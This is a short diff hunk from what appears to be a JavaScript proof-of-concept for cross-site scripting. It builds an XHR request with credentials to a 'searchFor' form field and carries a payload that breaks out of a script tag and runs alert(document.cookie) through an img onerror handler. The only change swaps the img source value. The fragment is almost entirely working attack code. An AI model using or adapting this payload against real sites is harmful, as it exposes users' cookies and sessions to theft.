@@ -8,7 +8,7 @@
   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xhr.withCredentials = true;
 
-  var payload = "</script><img src=x onerror=alert(document.cookie)>";
+  var payload = "</script><img src=q onerror=alert(document.cookie)>";
   var encodedPayload = encodeURIComponent(payload);
 
   var formData = "searchFor=" + encodedPayload + "&goButton=";
